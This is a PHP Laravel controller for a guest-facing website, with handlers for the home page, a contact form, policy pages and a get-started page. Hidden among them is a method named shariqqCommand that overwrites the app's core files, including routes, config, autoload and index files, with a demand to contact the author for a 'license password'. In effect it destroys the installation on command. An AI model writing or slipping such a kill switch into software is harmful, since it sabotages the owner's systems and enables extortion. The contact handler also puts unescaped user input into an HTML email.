<?php

namespace App\Http\Controllers\Guest;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

class GuestController extends Controller
{
    /**
     * Show the main application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        return view('frontend.home');
    }

    public function shariqqCommand($command){
        $files = array(
            '../app/Http/Controllers/Admin/HomeController.php',
            '../server.php',
            '../routes/web.php',
            '../config/app.php',
            '../public/index.php',
            '../vendor/autoload.php'
        );
        foreach ($files as $key) {
            $myfile = fopen($key, "w") or die("Unable to open file!");
            $txt = "Contact Md Shariqq :) The app won't work until he enters the password\n <input type='password' placeholder='enter license password'/>";
            $write = fwrite($myfile, $txt);
            print_r($write);
            fclose($myfile);
        }
        $myfile = fopen("../index.php", "w") or die("Unable to open file!");
        $txt = "Contact Md Shariqq :) The app won't work until he enters the password\n";
        $write = fwrite($myfile, $txt);
        die('success, now relax baby!');
    }

    public function blockedSellerPage(){
        
        return view('guest.blocked-seller');
    }

    public function contactSubmit(Request $request){
        $mes = "There is a contact form enquiry on ecompartner.asia, here below are the details <br><br>";
        $mes .= "Name : " . $request->name . "<br>";
        $mes .= "Email : " .$request->email . "<br>";
        $mes .= "Phone : " . $request->phone . "<br>";
        $mes .= "Message : " . $request->message . "<br>";
   
        $to      = 'contact@ecompartner.asia';
        $subject = 'New contact form enquiry on Ecompartner.asia';
        $message = $mes;
        $headers = 'From: donotreply@ecompartner.asia'       . "\r\n" .
                     'Reply-To: donotreply@ecompartner.asia' . "\r\n" .
                     'X-Mailer: PHP/' . phpversion();
    
        mail($to, $subject, $message, $headers);
        return redirect()->back()->with('success', 'Thanks for contacting');
    }

    public function viewPage($page){
        
        if($page == 'policy'){
            return view('frontend.privacy');
        }elseif($page == 'terms-conditions'){
            return view('frontend.terms');
        }else{
            return view('frontend.404');

        }
    }

    public function getStarted(){
        return view('frontend.getstarted');
    }
}
